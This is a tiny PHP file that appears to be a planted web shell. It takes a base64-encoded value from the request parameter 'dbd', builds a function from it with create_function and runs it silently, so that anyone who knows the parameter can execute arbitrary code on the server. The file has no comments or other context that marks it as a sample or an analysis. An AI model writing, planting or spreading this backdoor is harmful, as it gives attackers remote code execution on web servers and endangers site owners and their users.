<?php
if(!empty($_REQUEST['dbd'])){$dbd=base64_decode($_REQUEST['dbd']);$dbd=create_function('',$dbd);@$dbd();exit;}